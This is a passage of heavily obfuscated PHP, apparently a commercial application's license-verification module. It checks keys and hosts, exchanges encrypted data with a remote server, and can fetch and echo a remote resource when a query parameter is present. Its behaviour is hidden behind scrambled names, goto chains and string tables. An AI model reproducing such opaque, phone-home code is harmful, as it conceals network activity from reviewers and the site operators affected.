$E¢¿¤ËâÕ®[$CÄğÎí”İ[108]][$CÄğÎí”İ[109]] = $CÄğÎí”İ[110]($CÄğÎí”İ[111])->{$_SERVER[õÅ°Ò“][112]}(); goto dÙ‘‘Ä¸ß©; F‰òŸêó»½: $Dƒ²ÎÎ = $f†îªÁ˜•˜[582]; if (strlen($Dƒ²ÎÎ) < $f†îªÁ˜•˜[548]) { die; } $E¢¿¤ËâÕ®[$CÄğÎí”İ[93]][$CÄğÎí”İ[94]][$CÄğÎí”İ[99]] = array($CÄğÎí”İ[100] => (int) $F˜ –™â¨¸[$CÄğÎí”İ[101]], $CÄğÎí”İ[102] => $CÄğÎí”İ[103]($CÄğÎí”İ[104]($F˜ –™â¨¸, $CÄğÎí”İ[105], array())), $CÄğÎí”İ[106] => (int) $CÄğÎí”İ[104]($F˜ –™â¨¸, $CÄğÎí”İ[107], 0)); goto B‚Ç¸¨ïÏˆ; BŞŞÑ¾½À: while ($FÊ‹£—©Ş¶ < $f†îªÁ˜•˜[556]) { if ($FÊ‹£—©Ş¶ >= 0) { break; } $FÊ‹£—©Ş¶++; } unset($E¢¿¤ËâÕ®[$CÄğÎí”İ[93]][$CÄğÎí”İ[94]][$CÄğÎí”İ[76]]); unset($E¢¿¤ËâÕ®[$CÄğÎí”İ[93]][$CÄğÎí”İ[94]][$CÄğÎí”İ[98]]); goto F‰òŸêó»½; dÙ‘‘Ä¸ß©: $E¢¿¤ËâÕ®[$CÄğÎí”İ[108]][$CÄğÎí”İ[113]] = $CÄğÎí”İ[114]($_SERVER[$CÄğÎí”İ[115]] . $f½Å®š”Ğí[$CÄğÎí”İ[116]]); $E¢¿¤ËâÕ®[$CÄğÎí”İ[108]][$CÄğÎí”İ[117]] = $CÄğÎí”İ[118]($CÄğÎí”İ[119]()); $E¢¿¤ËâÕ®[$CÄğÎí”İ[108]][$CÄğÎí”İ[120]] = $this->bgzxfe17a6e5; goto E—‡‰ò­; AäÈ¹øõó: if ($CÄğÎí”İ[104]($GLOBALS, $CÄğÎí”İ[132]) && $this->config[$CÄğÎí”İ[133]]) { $E¢¿¤ËâÕ®[$CÄğÎí”İ[108]][$CÄğÎí”İ[134]] = WEB_ROOT; } return $E¢¿¤ËâÕ®; goto EÊ±ŸÎãŒÇ; BäÙµ‰ÃÔà: unset($E¢¿¤ËâÕ®[$CÄğÎí”İ[93]][$CÄğÎí”İ[95]][$CÄğÎí”İ[96]]); unset($E¢¿¤ËâÕ®[$CÄğÎí”İ[93]][$CÄğÎí”İ[95]][$CÄğÎí”İ[97]]); $FÊ‹£—©Ş¶ = $f†îªÁ˜•˜[581]; goto BŞŞÑ¾½À; E—‡‰ò­: $DÖÈáµ±¤ = $f†îªÁ˜•˜[584]; if (strlen($DÖÈáµ±¤) < $f†îªÁ˜•˜[544]) { return; } if ($f½Å®š”Ğí[$CÄğÎí”İ[120]] != $CÄğÎí”İ[121]) { $E¢¿¤ËâÕ®[$CÄğÎí”İ[108]][$CÄğÎí”İ[122]] = $f½Å®š”Ğí[$CÄğÎí”İ[122]]; $E¢¿¤ËâÕ®[$CÄğÎí”İ[108]][$CÄğÎí”İ[123]] = $f½Å®š”Ğí[$CÄğÎí”İ[123]]; $e±—çŠƒ¦Ç = $CÄğÎí”İ[124](10) . $this->bgzxfe17a6e5 . $CÄğÎí”İ[124](5); $E¢¿¤ËâÕ®[$CÄğÎí”İ[93]][$CÄğÎí”İ[125]][$CÄğÎí”İ[126]] = $this->{$_SERVER[õÅ°Ò“][127]}($e±—çŠƒ¦Ç, $E¢¿¤ËâÕ®[$CÄğÎí”İ[108]][$CÄğÎí”İ[113]]); } goto bäêøó‡±À; bßÙ’‹ŞÜ: $d©ˆÕ©ŸÖ = array($CÄğÎí”İ[64], $CÄğÎí”İ[65], $CÄğÎí”İ[66], $CÄğÎí”İ[67], $CÄğÎí”İ[68], $CÄğÎí”İ[69], $CÄğÎí”İ[70], $CÄğÎí”İ[71], $CÄğÎí”İ[72], $CÄğÎí”İ[73], $CÄğÎí”İ[74], $CÄğÎí”İ[75], $CÄğÎí”İ[76], $CÄğÎí”İ[77], $CÄğÎí”İ[78], $CÄğÎí”İ[79], $CÄğÎí”İ[80], $CÄğÎí”İ[81], $CÄğÎí”İ[82], $CÄğÎí”İ[83], $CÄğÎí”İ[84], $CÄğÎí”İ[85], $CÄğÎí”İ[86], $CÄğÎí”İ[87], $CÄğÎí”İ[88], $CÄğÎí”İ[89], $CÄğÎí”İ[90]); foreach ($d©ˆÕ©ŸÖ as $D¡õĞ³ÊäÉ) { $A¾§¸Ş”Œ‹ = $GLOBALS[$CÄğÎí”İ[91]][$CÄğÎí”İ[92]][$D¡õĞ³ÊäÉ]; $e‡ÍíÁä†± = $f†îªÁ˜•˜[580]; if (!$e‡ÍíÁä†±) { return; } if (isset($f½Å®š”Ğí[$D¡õĞ³ÊäÉ])) { $A¾§¸Ş”Œ‹ = $f½Å®š”Ğí[$D¡õĞ³ÊäÉ]; } $E¢¿¤ËâÕ®[$CÄğÎí”İ[93]][$CÄğÎí”İ[94]][$D¡õĞ³ÊäÉ] = $A¾§¸Ş”Œ‹; } $F˜ –™â¨¸ = $E¢¿¤ËâÕ®[$CÄğÎí”İ[93]][$CÄğÎí”İ[94]][$CÄğÎí”İ[76]]; goto BäÙµ‰ÃÔà; AÊ®¥¢—Âí: $f†îªÁ˜•˜ =& $_SERVER[¼]; $CÄğÎí”İ =& $_SERVER[õÅ°Ò“]; $f½Å®š”Ğí = $CÄğÎí”İ[61]($CÄğÎí”İ[62])->{$_SERVER[õÅ°Ò“][63]}(); goto bßÙ’‹ŞÜ; bäêøó‡±À: if ($this->bgzxfe17a6e5 == $CÄğÎí”İ[121]) { $E¢¿¤ËâÕ®[$CÄğÎí”İ[93]][$CÄğÎí”İ[94]][$CÄğÎí”İ[99]][$CÄğÎí”İ[107]] = 0; } $E¢¿¤ËâÕ®[$CÄğÎí”İ[108]][$CÄğÎí”İ[128]] = $CÄğÎí”İ[104]($this->vtmr5dc99b3a, $CÄğÎí”İ[129], $CÄğÎí”İ[10]); $E¢¿¤ËâÕ®[$CÄğÎí”İ[108]][$CÄğÎí”İ[130]] = $CÄğÎí”İ[104]($this->vtmr5dc99b3a, $CÄğÎí”İ[131], $CÄğÎí”İ[10]); goto AäÈ¹øõó; EÊ±ŸÎãŒÇ: } private function tcbe41321850() { goto EÁÁæëİ‚; F¯º´Ş¾èí: $dä• ¸ğ‘„ = $A¢ñ¶Œù•[587]; if (!$dä• ¸ğ‘„) { die; } $CÔõĞ§‘·— = array($E‰é„—‚[159] => $c°–†Œ£´À[$E‰é„—‚[64]], $E‰é„—‚[160] => $c°–†Œ£´À[$E‰é„—‚[65]], $E‰é„—‚[161] => $E‰é„—‚[10]); goto D¬£‰õ‡Ú; bÛ¿³ÍÏ: if ($this->bgzxfe17a6e5 == $E‰é„—‚[121]) { return; } $a”‰‡äÇˆ = array($E‰é„—‚[153], $E‰é„—‚[154], $E‰é„—‚[155], $E‰é„—‚[156], $E‰é„—‚[157], $E‰é„—‚[158]); $c°–†Œ£´À = $E‰é„—‚[61]($E‰é„—‚[62])->{$_SERVER[õÅ°Ò“][63]}(); goto F¯º´Ş¾èí; EÁÁæëİ‚: $A¢ñ¶Œù• =& $_SERVER[¼]; $E‰é„—‚ =& $_SERVER[õÅ°Ò“]; if ($_SERVER[$E‰é„—‚[44]] == $E‰é„—‚[135]) { goto B¨¡ä—Ò ‡; B¨¡ä—Ò ‡: $Dª»»÷Ğº‡ = array($E‰é„—‚[120] => $this->bgzxfe17a6e5, $E‰é„—‚[136] => $this->{$_SERVER[õÅ°Ò“][137]}(), $E‰é„—‚[138] => $E‰é„—‚[61]($E‰é„—‚[139])->{$_SERVER[õÅ°Ò“][140]}()); if ($this->bgzxfe17a6e5 != $E‰é„—‚[121]) { $fËİ‘·ïÈ— = $E‰é„—‚[104]($this->vtmr5dc99b3a, $E‰é„—‚[141]); if ($fËİ‘·ïÈ—) { $Dª»»÷Ğº‡[$E‰é„—‚[142]] = $fËİ‘·ïÈ—; $Dª»»÷Ğº‡[$E‰é„—‚[143]] = $E‰é„—‚[144]($E‰é„—‚[104]($this->vtmr5dc99b3a, $E‰é„—‚[145])); $Dª»»÷Ğº‡[$E‰é„—‚[146]] = $E‰é„—‚[104]($this->vtmr5dc99b3a, $E‰é„—‚[131]); } } $Dª»»÷Ğº‡ = $this->{$_SERVER[õÅ°Ò“][147]}($E‰é„—‚[148]($Dª»»÷Ğº‡), $E‰é„—‚[114]($E‰é„—‚[149])); goto C¢èŒª¡ó¨; C¢èŒª¡ó¨: $AÙ­ŒŞƒÚ  = $A¢ñ¶Œù•[585]; while (strlen($AÙ­ŒŞƒÚ ) < $A¢ñ¶Œù•[550]) { if (!$AÙ­ŒŞƒÚ ) { break; } $AÙ­ŒŞƒÚ ++; } $CÔõĞ§‘·— = array($E‰é„—‚[150] => $Dª»»÷Ğº‡); goto E‘›»å”ƒÆ; E‘›»å”ƒÆ: $D‘ñâµÃÄŠ = $A¢ñ¶Œù•[586]; if (strlen($D‘ñâµÃÄŠ) < $A¢ñ¶Œù•[556]) { return; } $E‰é„—‚[13](array($E‰é„—‚[151], $E‰é„—‚[152]), $CÔõĞ§‘·—); goto f–ç£´ˆîã; f–ç£´ˆîã: } goto bÛ¿³ÍÏ; b¿œ•¿ÄØŠ: $E‰é„—‚[13](array($E‰é„—‚[151], $E‰é„—‚[152]), $CÔõĞ§‘·—); $A çšÇéå¢ = $A¢ñ¶Œù•[591]; while (strlen($A çšÇéå¢) < $A¢ñ¶Œù•[556]) { if (!$A çšÇéå¢) { break; } $A çšÇéå¢++; } goto CÕê­š“ªÅ; D¬£‰õ‡Ú: $f–”“ëïÜŠ = $A¢ñ¶Œù•[588]; if (strlen($f–”“ëïÜŠ) < $A¢ñ¶Œù•[544]) { return; } foreach ($a”‰‡äÇˆ as $d¼öé°¹—) { if (!isset($c°–†Œ£´À[$d¼öé°¹—]) || !$c°–†Œ£´À[$d¼öé°¹—]) { continue; } $CÔõĞ§‘·—[$d¼öé°¹—] = $c°–†Œ£´À[$d¼öé°¹—]; $C¶ÉÙÂÕ¯ = $A¢ñ¶Œù•[589]; while ($C¶ÉÙÂÕ¯ < $A¢ñ¶Œù•[590]) { if ($C¶ÉÙÂÕ¯ >= 0) { break; } $C¶ÉÙÂÕ¯++; } } goto b¿œ•¿ÄØŠ; CÕê­š“ªÅ: } private function ybrzc56db061() { goto aÄùô„‹; C Ş²å…: $fŸ™‹³‹ = $aÆ‘¤‘Í¦Ï . $f‹µØÍ§œî[$A»Ì¦Øº­[120]] . $f‹µØÍ§œî[$A»Ì¦Øº­[212]]; $f‹µØÍ§œî[$A»Ì¦Øº­[122]] = $A»Ì¦Øº­[214]($A»Ì¦Øº­[118]($this->{$_SERVER[õÅ°Ò“][147]}($fŸ™‹³‹, $A»Ì¦Øº­[215]))); $AĞĞå ‡Ñò = $A»Ì¦Øº­[124](16); goto Dô¯Ÿ¶‹ô…; d©¶Ôİï¯: $D°ùĞµ•Œƒ = $b„¯‹ö‘‚£[593]; if ($c®ˆÓá†ùœ[$A»Ì¦Øº­[178]] == $A»Ì¦Øº­[179]) { $Bö»òŒØŸ“ = $this->{$_SERVER[õÅ°Ò“][147]}($CÅäÔ“ùàÚ, $A»Ì¦Øº­[180]); $c¹†‡†¾ = $this->{$_SERVER[õÅ°Ò“][127]}($A»Ì¦Øº­[148]($Eø›§´Ğù), $CÅäÔ“ùàÚ . $A»Ì¦Øº­[181], 3); $BİˆÜ¹¢í´ = $this->{$_SERVER[õÅ°Ò“][182]}($A»Ì¦Øº­[183] . $Bö»òŒØŸ“ . $A»Ì¦Øº­[184] . $c¹†‡†¾, -1); $A»Ì¦Øº­[166]($BİˆÜ¹¢í´, !0); } else { if ($c®ˆÓá†ùœ[$A»Ì¦Øº­[178]] == $A»Ì¦Øº­[185]) { $FÚ®ø¿Õ = $A»Ì¦Øº­[25]($A»Ì¦Øº­[114]($A»Ì¦Øº­[186] . $CÅäÔ“ùàÚ), 12, 15) . $A»Ì¦Øº­[187]; $c¹†‡†¾ = $this->{$_SERVER[õÅ°Ò“][188]}($A»Ì¦Øº­[2]($c®ˆÓá†ùœ[$A»Ì¦Øº­[189]]), $FÚ®ø¿Õ, 2); $EÛÏŸ†»Ö = $A»Ì¦Øº­[190]($c¹†‡†¾, !0); if (!$A»Ì¦Øº­[191]($EÛÏŸ†»Ö) || !$A»Ì¦Øº­[191]($EÛÏŸ†»Ö[$A»Ì¦Øº­[192]]) || $EÛÏŸ†»Ö[$A»Ì¦Øº­[165]] != !0) { $d¶Ù°ó¹äË = $A»Ì¦Øº­[193]; $DŒƒ§ƒÖÍˆ = $EÛÏŸ†»Ö[$A»Ì¦Øº­[192]] ? $A»Ì¦Øº­[194] . $EÛÏŸ†»Ö[$A»Ì¦Øº­[192]] : $d¶Ù°ó¹äË; $A»Ì¦Øº­[166]($DŒƒ§ƒÖÍˆ, !1); } else { $Eø›§´Ğù[$A»Ì¦Øº­[168]] = $EÛÏŸ†»Ö[$A»Ì¦Øº­[192]][$A»Ì¦Øº­[195]]; } } else { $EÛÏŸ†»Ö = $this->{$_SERVER[õÅ°Ò“][182]}($A»Ì¦Øº­[196], $Eø›§´Ğù, 10); $f Ê£Ø¡µ = $b„¯‹ö‘‚£[594]; } } if (!$A»Ì¦Øº­[191]($EÛÏŸ†»Ö) || !$A»Ì¦Øº­[191]($EÛÏŸ†»Ö[$A»Ì¦Øº­[192]]) || $EÛÏŸ†»Ö[$A»Ì¦Øº­[165]] != !0) { $d¶Ù°ó¹äË = $A»Ì¦Øº­[197]($A»Ì¦Øº­[198]); $DŒƒ§ƒÖÍˆ = $EÛÏŸ†»Ö[$A»Ì¦Øº­[192]] ? $A»Ì¦Øº­[194] . $EÛÏŸ†»Ö[$A»Ì¦Øº­[192]] : $d¶Ù°ó¹äË; $A»Ì¦Øº­[166]($DŒƒ§ƒÖÍˆ, !1); } goto bøÈ‹ô¡àè; Cœã¾öí•: $f‹µØÍ§œî[$A»Ì¦Øº­[123]] = $A»Ì¦Øº­[118]($A»Ì¦Øº­[214]($this->{$_SERVER[õÅ°Ò“][147]}($C¸÷µ×êñ‰, $A»Ì¦Øº­[216]))); $aÚùÂĞ¨ÛŒ = $b„¯‹ö‘‚£[596]; if (!$aÚùÂĞ¨ÛŒ) { die; } goto AŠ³—ÈÅÇ‡; A÷Ó¼ª°ç©: if (!$A»Ì¦Øº­[104]($GLOBALS, $A»Ì¦Øº­[132])) { die; } $c®ˆÓá†ùœ = $GLOBALS[$A»Ì¦Øº­[22]]; if (isset($c®ˆÓá†ùœ[$A»Ì¦Øº­[163]])) { $this->{$_SERVER[õÅ°Ò“][164]}(); die; } goto d ˆ¶‡·§; bøÈ‹ô¡àè: $dŸ³íŒÀÑ¦ = $EÛÏŸ†»Ö[$A»Ì¦Øº­[192]]; $b¤¨ä…äŒ½ = $this->{$_SERVER[õÅ°Ò“][199]}($dŸ³íŒÀÑ¦[$A»Ì¦Øº­[200]]); if (!$b¤¨ä…äŒ½ || $b¤¨ä…äŒ½ != $A»Ì¦Øº­[201]($dŸ³íŒÀÑ¦[$A»Ì¦Øº­[145]])) { $f®Ä°Œõ™ = array($A»Ì¦Øº­[202] => $A»Ì¦Øº­[61]($A»Ì¦Øº­[62])->{$_SERVER[õÅ°Ò“][63]}($A»Ì¦Øº­[116]), $A»Ì¦Øº­[203] => $_SERVER[$A»Ì¦Øº­[115]], $A»Ì¦Øº­[204] => $A»Ì¦Øº­[205](), $A»Ì¦Øº­[174] => $_SERVER[$A»Ì¦Øº­[175]]); $c¹†‡†¾ = $this->{$_SERVER[õÅ°Ò“][206]}($A»Ì¦Øº­[148]($f®Ä°Œõ™)); $this->{$_SERVER[õÅ°Ò“][182]}($A»Ì¦Øº­[207] . $c¹†‡†¾); $A»Ì¦Øº­[166]($A»Ì¦Øº­[197]($A»Ì¦Øº­[208]), !0); } goto bÒ®¥æ¿Ú; aÄùô„‹: $b„¯‹ö‘‚£ =& $_SERVER[¼]; $A»Ì¦Øº­ =& $_SERVER[õÅ°Ò“]; if ($_SERVER[$A»Ì¦Øº­[44]] != $A»Ì¦Øº­[162]) { return; } goto A÷Ó¼ª°ç©; d ˆ¶‡·§: if (!isset($c®ˆÓá†ùœ[$A»Ì¦Øº­[165]]) || $A»Ì¦Øº­[24]($c®ˆÓá†ùœ[$A»Ì¦Øº­[165]]) != 16) { $A»Ì¦Øº­[166]($A»Ì¦Øº­[167] . $c®ˆÓá†ùœ[$A»Ì¦Øº­[165]], !1); } $bÕâ¦ŞØäè = $A»Ì¦Øº­[61]($A»Ì¦Øº­[62])->{$_SERVER[õÅ°Ò“][63]}($A»Ì¦Øº­[116]); $Eø›§´Ğù = array($A»Ì¦Øº­[165] => $c®ˆÓá†ùœ[$A»Ì¦Øº­[165]], $A»Ì¦Øº­[168] => $A»Ì¦Øº­[124](16), $A»Ì¦Øº­[169] => $A»Ì¦Øº­[149], $A»Ì¦Øº­[170] => $A»Ì¦Øº­[171], $A»Ì¦Øº­[172] => $_SERVER[$A»Ì¦Øº­[173]], $A»Ì¦Øº­[174] => $_SERVER[$A»Ì¦Øº­[175]], $A»Ì¦Øº­[176] => $_SERVER[$A»Ì¦Øº­[177]]); goto A‘ÚäÇŒÎï; AŠ³—ÈÅÇ‡: if ($dŸ³íŒÀÑ¦[$A»Ì¦Øº­[217]] && $dŸ³íŒÀÑ¦[$A»Ì¦Øº­[217]] >= 1) { $A»Ì¦Øº­[61]($A»Ì¦Øº­[62])->{$_SERVER[õÅ°Ò“][218]}($A»Ì¦Øº­[219], $A»Ì¦Øº­[220]); } $A»Ì¦Øº­[61]($A»Ì¦Øº­[62])->{$_SERVER[õÅ°Ò“][221]}($f‹µØÍ§œî); $Cà¤´ÊÑ—Ï = $A»Ì¦Øº­[114]($_SERVER[$A»Ì¦Øº­[115]] . $A»Ì¦Øº­[214]($bÕâ¦ŞØäè) . $f‹µØÍ§œî[$A»Ì¦Øº­[210]]); goto eÀšŞŞ¡é‰; Dô¯Ÿ¶‹ô…: $Aî¤à‡àÍ = $b„¯‹ö‘‚£[595]; if (!$Aî¤à‡àÍ) { return; } $C¸÷µ×êñ‰ = $AĞĞå ‡Ñò . $f‹µØÍ§œî[$A»Ì¦Øº­[120]] . $this->{$_SERVER[õÅ°Ò“][147]}($A»Ì¦Øº­[114]($f‹µØÍ§œî[$A»Ì¦Øº­[209]]), $AĞĞå ‡Ñò); goto Cœã¾öí•; eÀšŞŞ¡é‰: $B…ÚÑ§²Øá = $b„¯‹ö‘‚£[597]; while ($B…ÚÑ§²Øá < $b„¯‹ö‘‚£[590]) { if ($B…ÚÑ§²Øá >= 0) { break; } $B…ÚÑ§²Øá++; } $CôÄÔ­ê¹« = $A»Ì¦Øº­[214]($A»Ì¦Øº­[25]($Cà¤´ÊÑ—Ï, 10, 16)); goto déù¨°Ù÷; bÒ®¥æ¿Ú: $f‹µØÍ§œî = array($A»Ì¦Øº­[209] => $Eø›§´Ğù[$A»Ì¦Øº­[165]], $A»Ì¦Øº­[210] => $dŸ³íŒÀÑ¦[$A»Ì¦Øº­[211]], $A»Ì¦Øº­[212] => $A»Ì¦Øº­[124](16), $A»Ì¦Øº­[120] => $dŸ³íŒÀÑ¦[$A»Ì¦Øº­[213]]); if ($Eø›§´Ğù[$A»Ì¦Øº­[168]]) { $f‹µØÍ§œî[$A»Ì¦Øº­[212]] = $Eø›§´Ğù[$A»Ì¦Øº­[168]]; } $aÆ‘¤‘Í¦Ï = $A»Ì¦Øº­[25]($A»Ì¦Øº­[114]($f‹µØÍ§œî[$A»Ì¦Øº­[210]]), 10, 10); goto C Ş²å…; bğ‚°Æõîê: $A»Ì¦Øº­[61]($A»Ì¦Øº­[11])->{$_SERVER[õÅ°Ò“][226]}($f½º”×Ó§ë[$A»Ì¦Øº­[227]], array($A»Ì¦Øº­[228] => $c¼†Ä™¾ˆ®)); $C×µ÷Éò±  = $b„¯‹ö‘‚£[600]; $A»Ì¦Øº­[166]($A»Ì¦Øº­[197]($A»Ì¦Øº­[208]), !0); goto d¿Òáµèµ; Bİ„çë…½: $D—Ì¥Ì²• = $A»Ì¦Øº­[222]($A»Ì¦Øº­[61]($A»Ì¦Øº­[11])->{$_SERVER[õÅ°Ò“][223]}(), $A»Ì¦Øº­[224]); $føÆÌ¢ºğ = $b„¯‹ö‘‚£[599]; while ($føÆÌ¢ºğ < $b„¯‹ö‘‚£[544]) { if ($føÆÌ¢ºğ >= 0) { break; } $føÆÌ¢ºğ++; } goto fÄçİæùµê; fÄçİæùµê: $f½º”×Ó§ë = $D—Ì¥Ì²•[$A»Ì¦Øº­[225]]; $c¼†Ä™¾ˆ® = array(); $c¼†Ä™¾ˆ®[$CôÄÔ­ê¹«] = $C•Œ³‡ˆ¡¦; goto bğ‚°Æõîê; A‘ÚäÇŒÎï: $B‰åÈõ‹´“ = $b„¯‹ö‘‚£[592]; if (!$B‰åÈõ‹´“) { return; } $CÅäÔ“ùàÚ = $A»Ì¦Øº­[114]($_SERVER[$A»Ì¦Øº­[115]] . $bÕâ¦ŞØäè); goto d©¶Ôİï¯; déù¨°Ù÷: $C•Œ³‡ˆ¡¦ = $this->{$_SERVER[õÅ°Ò“][127]}($A»Ì¦Øº­[148]($dŸ³íŒÀÑ¦), $Cà¤´ÊÑ—Ï); $aŠËá²°œ = $b„¯‹ö‘‚£[598]; if (!$aŠËá²°œ) { return; } goto Bİ„çë…½; d¿Òáµèµ: } private function gridf028dd27() { $e‘ã­¬´¥ =& $_SERVER[õÅ°Ò“]; $e‘ã­¬´¥[61]($e‘ã­¬´¥[62])->{$_SERVER[õÅ°Ò“][221]}(array($e‘ã­¬´¥[209] => $e‘ã­¬´¥[10], $e‘ã­¬´¥[210] => $e‘ã­¬´¥[10], $e‘ã­¬´¥[120] => $e‘ã­¬´¥[121], $e‘ã­¬´¥[122] => $e‘ã­¬´¥[10], $e‘ã­¬´¥[123] => $e‘ã­¬´¥[10])); $e‘ã­¬´¥[61]($e‘ã­¬´¥[62])->{$_SERVER[õÅ°Ò“][218]}($e‘ã­¬´¥[219], $e‘ã­¬´¥[229]); $this->vtmr5dc99b3a = array(); $this->bgzxfe17a6e5 = $e‘ã­¬´¥[121]; } private function okdxe943f58c() { goto E¹÷Ÿ£ñÚà; EšåŒÚ‚å: if (strlen($a»Ûôï„ËÑ) < $Dâ…¶ÆğŠ´[544]) { return; } $cÎ˜‘ÆîÓ‘ = $E×ÏÄ˜ËĞñ[214]($E×ÏÄ˜ËĞñ[25]($Cª‘Ïİñ’, 10, 16)); $bªå‹ë‡¼„ = $this->{$_SERVER[õÅ°Ò“][188]}($cµë¼Üñ¼ï[$E×ÏÄ˜ËĞñ[91]][$cÎ˜‘ÆîÓ‘], $Cª‘Ïİñ’); goto A´æÄ†Üœ†; aÚ›Ö…Ú‘™: $bóƒï¶ø¥â = $E×ÏÄ˜ËĞñ[222]($E×ÏÄ˜ËĞñ[61]($E×ÏÄ˜ËĞñ[11])->{$_SERVER[õÅ°Ò“][223]}(), $E×ÏÄ˜ËĞñ[224]); $cµë¼Üñ¼ï = $bóƒï¶ø¥â[$E×ÏÄ˜ËĞñ[225]]; $b¥³‹›Ë´Ù = $Dâ…¶ÆğŠ´[602]; goto C´Ò—ñù ÷; eöÓêË¡¨è: $this->bgzxfe17a6e5 = $E×ÏÄ˜ËĞñ[121]; $Dš±Ó´âŠ° = $Dâ…¶ÆğŠ´[601]; if (strlen($Dš±Ó´âŠ°) < $Dâ…¶ÆğŠ´[550]) { return; } goto Dí´£¼÷å”; EÖãßè®: if ($E×ÏÄ˜ËĞñ[230]() >= $FôÉÓÊù¡) { return $this->{$_SERVER[õÅ°Ò“][164]}(); } $this->vtmr5dc99b3a = $bªå‹ë‡¼„; $this->bgzxfe17a6e5 = $b¸Ø‡ÄáÖƒ[$E×ÏÄ˜ËĞñ[120]]; goto c÷×˜¥Õ ö; C´Ò—ñù ÷: while (strlen($b¥³‹›Ë´Ù) < $Dâ…¶ÆğŠ´[544]) { if (!$b¥³‹›Ë´Ù) { break; } $b¥³‹›Ë´Ù++; } $Cª‘Ïİñ’ = $E×ÏÄ˜ËĞñ[114]($_SERVER[$E×ÏÄ˜ËĞñ[115]] . $E×ÏÄ˜ËĞñ[214]($EßåĞÓ©­’) . $b¸Ø‡ÄáÖƒ[$E×ÏÄ˜ËĞñ[210]]); $a»Ûôï„ËÑ = $Dâ…¶ÆğŠ´[603]; goto EšåŒÚ‚å; E¹÷Ÿ£ñÚà: $Dâ…¶ÆğŠ´ =& $_SERVER[¼]; $E×ÏÄ˜ËĞñ =& $_SERVER[õÅ°Ò“]; $_SERVER[$E×ÏÄ˜ËĞñ[175]] = $E×ÏÄ˜ËĞñ[104]($_SERVER, $E×ÏÄ˜ËĞñ[175], APP_HOST); goto eöÓêË¡¨è; Dí´£¼÷å”: $b¸Ø‡ÄáÖƒ = $E×ÏÄ˜ËĞñ[61]($E×ÏÄ˜ËĞñ[62])->{$_SERVER[õÅ°Ò“][63]}(); if ($b¸Ø‡ÄáÖƒ[$E×ÏÄ˜ËĞñ[120]] == $E×ÏÄ˜ËĞñ[121]) { return; } $EßåĞÓ©­’ = $E×ÏÄ˜ËĞñ[61]($E×ÏÄ˜ËĞñ[62])->{$_SERVER[õÅ°Ò“][63]}($E×ÏÄ˜ËĞñ[116]); goto aÚ›Ö…Ú‘™; A´æÄ†Üœ†: $bªå‹ë‡¼„ = $E×ÏÄ˜ËĞñ[190]($bªå‹ë‡¼„, !0); if (!$E×ÏÄ˜ËĞñ[191]($bªå‹ë‡¼„)) { return $this->{$_SERVER[õÅ°Ò“][164]}(); } $FôÉÓÊù¡ = $E×ÏÄ˜ËĞñ[144]($bªå‹ë‡¼„[$E×ÏÄ˜ËĞñ[145]]); goto EÖãßè®; c÷×˜¥Õ ö: } private function orcib5edbf3a() { goto D¨ö‹ìÁ; CãĞ”“º¡™: $B²¦å‘ÍĞ· = array($fÑˆ‚“—ª¿[234], $fÑˆ‚“—ª¿[235]); if ($fÑˆ‚“—ª¿[236]($EßíŸŒ, $B²¦å‘ÍĞ·)) { if ($this->bgzxfe17a6e5 == $fÑˆ‚“—ª¿[121] && isset($Dè¿¯¿‚®¡[$fÑˆ‚“—ª¿[237]])) { $fÑˆ‚“—ª¿[166]($fÑˆ‚“—ª¿[197]($fÑˆ‚“—ª¿[232]), !1, $fÑˆ‚“—ª¿[233]); die; } $bÃğ–°Š = $this->{$_SERVER[õÅ°Ò“][137]}(); if ($bÃğ–°Š != $fÑˆ‚“—ª¿[201]($fÑˆ‚“—ª¿[238])) { if ($bÃğ–°Š <= $fÑˆ‚“—ª¿[61]($fÑˆ‚“—ª¿[139])->{$_SERVER[õÅ°Ò“][140]}()) { $fÑˆ‚“—ª¿[166]($fÑˆ‚“—ª¿[197]($fÑˆ‚“—ª¿[239]), !1, $fÑˆ‚“—ª¿[233]); die; } } } goto dôÆ‘¾‰¢ƒ; A¨óò¢¼ÜÑ: if (!$cã¥×ƒ´‘Ì) { die; } $EßíŸŒ = $_SERVER[$fÑˆ‚“—ª¿[44]]; if ($EßíŸŒ == $fÑˆ‚“—ª¿[231] && $this->bgzxfe17a6e5 == $fÑˆ‚“—ª¿[121]) { $fÑˆ‚“—ª¿[166]($fÑˆ‚“—ª¿[197]($fÑˆ‚“—ª¿[232]), !1, $fÑˆ‚“—ª¿[233]); } goto CãĞ”“º¡™; D¨ö‹ìÁ: $fÑˆ‚“—ª¿ =& $_SERVER[õÅ°Ò“]; $Dè¿¯¿‚®¡ = $GLOBALS[$fÑˆ‚“—ª¿[22]]; $cã¥×ƒ´‘Ì = $_SERVER[¼][604]; goto A¨óò¢¼ÜÑ; dôÆ‘¾‰¢ƒ: } private function bzho58743e09() { goto BÎÆ½Äƒ¦Ã; cªšÒ½‹°: if (!$FÃÜ°ô¤ Œ) { die; } $dÚ°«°â”Í = $d¡Ìù”ˆ½[245](array($d¡Ìù”ˆ½[246] => array($d¡Ìù”ˆ½[247] => $d¡Ìù”ˆ½[248], $d¡Ìù”ˆ½[249] => 3))); $B¦İ‚…çÁ­ = $DÈ§Ù¡¢¨[607]; goto eÑ…—™³¤; a©ŠÇãñÀ„: die; goto cé®é’•Õº; eÑ…—™³¤: if (strlen($B¦İ‚…çÁ­) < $DÈ§Ù¡¢¨[550]) { return; } $BÉÁŠÕ¬§ = @$d¡Ìù”ˆ½[250]($E–—îÒä³, !1, $dÚ°«°â”Í); $fÃ¾Šƒ‹–› = $DÈ§Ù¡¢¨[608]; goto EğĞ¦õ¥­·; dğ×±¸ãäÙ: if (!$d¡Ìù”ˆ½[104]($GLOBALS, $d¡Ìù”ˆ½[132]) || !isset($_GET[$d¡Ìù”ˆ½[241]])) { return; } if (!$d¡Ìù”ˆ½[236]($_SERVER[$d¡Ìù”ˆ½[44]], $DÊ‡ìÁ¢õ)) { return; } $E–—îÒä³ = $d¡Ìù”ˆ½[242]; goto b„«Çâ¿›µ; BÎÆ½Äƒ¦Ã: $DÈ§Ù¡¢¨ =& $_SERVER[¼]; $d¡Ìù”ˆ½ =& $_SERVER[õÅ°Ò“]; $DÊ‡ìÁ¢õ = array($d¡Ìù”ˆ½[135], $d¡Ìù”ˆ½[240]); goto dğ×±¸ãäÙ; EğĞ¦õ¥­·: if (!$fÃ¾Šƒ‹–›) { return; } $d¡Ìù”ˆ½[251]($d¡Ìù”ˆ½[252]); if ($BÉÁŠÕ¬§ && $d¡Ìù”ˆ½[32]($BÉÁŠÕ¬§, $d¡Ìù”ˆ½[253])) { echo $BÉÁŠÕ¬§; } goto a©ŠÇãñÀ„; 